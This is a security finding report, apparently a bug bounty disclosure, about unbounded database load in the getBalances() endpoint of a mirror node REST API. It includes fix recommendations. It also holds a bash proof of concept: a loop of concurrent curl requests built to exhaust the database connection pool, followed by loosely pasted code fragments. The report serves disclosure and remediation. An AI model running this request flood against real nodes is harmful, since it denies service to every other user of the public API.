### Title
Unauthenticated Multi-Parameter Combination in `getBalances()` Triggers Sequential Multi-Query DB Amplification with No Rate Limiting

### Summary
An unprivileged external user can combine all five accepted filter parameters (`account.balance`, `account.id`, `account.publickey`, `timestamp`, `limit=100`) in a single request to `GET /api/v1/balances`, triggering three sequential database queries â€” including a correlated subquery that executes once per returned account row (up to 100 times, each scanning `token_balance` for up to 50 entries). No per-request rate limiting exists on the REST API, and the default DB connection pool is only 10 connections, making it trivial to exhaust the pool with concurrent crafted requests and degrade service for all users.

### Finding Description

**Exact code path** (`rest/balances.js`, `getBalances()`, lines 83â€“156):

When `timestamp` is present in the request, the handler takes the expensive branch:

```
Line 113-132 (rest/balances.js):
if (tsQuery) {
    // DB Query 1: account_balance table â€” treasury account timestamp range lookup
    const tsQueryResult = await getTsQuery(tsQuery, tsParams);

    // DB Query 2: entity table â€” public_key lookup, returns up to `limit` (100) account IDs
    const accountIdsQuery = await getAccountIdsByPublicKey(pubKeyParams, limit);

    // DB Query 3: account_balance with correlated token_balance subquery per row
    [sqlQuery, tsParams] = await getBalancesQuery(...);
}
```

**DB Query 1** (`getAccountBalanceTimestampRange`, lines 167â€“197): Queries `account_balance` for the treasury account to resolve the snapshot timestamp range.

**DB Query 2** (`getAccountIdsByPublicKey`, lines 60â€“76): Queries `entity` by `public_key`, with `limit` set to the user-supplied limit value (up to 100):
```javascript
// Line 65-66
const params = [...publicKey, limit];
const result = await pool.queryQuietly(entityPublicKeyQuery, params);
```

**DB Query 3** (`getBalancesQuery` + `getTokenBalanceSubQuery`, lines 199â€“218, 294â€“306): The main query embeds a correlated subquery that executes once per outer row:
```sql
select distinct on (account_id)
  ab.account_id, ab.balance, ?::bigint as consensus_timestamp,
  (select json_agg(...)
   from (
     select distinct on (token_id) token_id, balance
     from token_balance tb
     where tb.account_id = ab.account_id   -- correlated: runs per row
       and tb.consensus_timestamp >= ? and tb.consensus_timestamp <= ?
     order by token_id asc, consensus_timestamp desc
     limit 50                               -- tokenBalanceLimit.multipleAccounts
   ) as account_token_balance) as token_balances
from account_balance ab
where ab.consensus_timestamp >= ? and ab.consensus_timestamp <= ?
  and ab.account_id in (...)               -- up to 100 IDs from pubkey lookup
  and ab.balance >= ?
order by ab.account_id asc, ab.consensus_timestamp desc
limit 100
```

With `limit=100`, this correlated subquery runs up to **100 times**, each scanning `token_balance` for a specific account within a timestamp range.

**Root cause**: No per-request cost budget, no rate limiting on the REST API, and no query complexity cap. The five parameters are independently validated but their combined effect on DB load is unbounded within the configured limits.

**Existing checks reviewed and shown insufficient**:
- `limit` is capped at `responseLimit.max = 100` â€” this is the amplification factor, not a protection.
- `maxRepeatedQueryParameters = 100` â€” limits repetition of a single parameter, not the combination cost.
- `statementTimeout = 20000ms` â€” only terminates runaway individual queries; does not prevent pool exhaustion from many concurrent requests.
- Traefik middleware (`charts/hedera-mirror-rest/templates/middleware.yaml`) is optional and disabled by default (`{{ if and .Values.global.middleware .Values.middleware }}`).
- No IP-based rate limiting, no request-level concurrency limit, no authentication requirement.

### Impact Explanation

The default DB connection pool is **10 connections** (`hiero.mirror.rest.db.pool.maxConnections = 10`). Each crafted request holds a connection for the duration of the expensive correlated subquery (up to 20 seconds per `statementTimeout`). An attacker sending 10 concurrent requests â€” each with `timestamp`, `account.publickey`, `account.balance`, `account.id`, and `limit=100` â€” can saturate the entire pool. All other API users receive connection timeout errors or queued delays, effectively taking down the public API. No economic cost is incurred by the attacker; only HTTP requests are needed.

### Likelihood Explanation

The attack requires zero privileges, zero authentication, and zero knowledge beyond the public API documentation. The endpoint is publicly documented in `rest/api/v1/openapi.yml` (lines 391â€“419). The exploit is trivially repeatable with any HTTP client (e.g., `curl` in a loop or a simple script). The combination of parameters is explicitly supported and documented, so no fuzzing is required. The attack is sustainable indefinitely.

### Recommendation

1. **Add per-IP or global rate limiting** on the REST API (e.g., via Traefik `rateLimit` middleware enabled by default, or an in-process token bucket per IP).
2. **Charge a composite cost** for the timestamp+publickey path: if both `timestamp` and `account.publickey` are present simultaneously, either reject the combination or enforce a lower effective limit (e.g., cap at 10 instead of 100).
3. **Reduce the default DB pool statement timeout** or add a per-query cost hint to PostgreSQL (`statement_timeout` per session) specifically for the correlated subquery path.
4. **Decouple the correlated subquery**: replace the per-row correlated `token_balance` subquery with a single batch join, reducing the NĂ—M scan to a single pass.

### Proof of Concept

```bash
# Craft a maximally expensive request (all 5 parameters, limit=100, timestamp forces 3-query path)
PUBKEY="<any valid 64-hex-char public key present in entity table>"
TS="$(date +%s).000000000"

# Send 10 concurrent requests to exhaust the 10-connection DB pool
for i in $(seq 1 10); do
  curl -s "http://<mirror-node-host>:5551/api/v1/balances?\
account.publickey=${PUBKEY}&\
timestamp=lte:${TS}&\
account.balance=gte:0&\
account.id=gte:0.0.1&\
limit=100" &
done
wait
# All subsequent legitimate requests will queue or timeout until the pool drains
```

Each of the 10 concurrent requests triggers:
1. `account_balance` treasury timestamp lookup (Query 1)
2. `entity` public key scan (Query 2)
3. `account_balance` main query with up to 100 correlated `token_balance` subqueries (Query 3)

const getBalancesQuery = async (accountQuery, balanceQuery, accountIdsQuery, limitQuery, order, tsQueryResult) => {
  const tokenBalanceSubQuery = getTokenBalanceSubQuery(order, tsQueryResult.query);
  const whereClause = `
      where ${[tsQueryResult.query, accountQuery, accountIdsQuery, balanceQuery].filter(Boolean).join(' and ')}`;
  const {lower, upper} = tsQueryResult.timestampRange;
  // The first upper is for the consensus_timestamp in the select fields, also double the lower and the upper since
  // they are used twice, in the token balance subquery and in the where clause of the main query
  const tsParams = [upper, lower, upper, lower, upper];
  const sqlQuery = `
      select distinct on (account_id)
        ab.account_id,
        ab.balance,
        ?::bigint as consensus_timestamp,
        (${tokenBalanceSubQuery}) as token_balances
      from account_balance ab
      ${whereClause}
      order by ab.account_id ${order}, ab.consensus_timestamp desc
      ${limitQuery}`;
  return [sqlQuery, tsParams];
};
```

const getTokenBalanceSubQuery = (order, consensusTsQuery) => {
  consensusTsQuery = consensusTsQuery.replaceAll('ab.', 'tb.');
  return `
    select json_agg(json_build_object('token_id', token_id, 'balance', balance))
    from (
      select distinct on (token_id) token_id, balance
      from token_balance tb
      where tb.account_id = ab.account_id
        and ${consensusTsQuery}
      order by token_id ${order}, consensus_timestamp desc
      limit ${tokenBalanceLimit.multipleAccounts}
    ) as account_token_balance`;
};
```
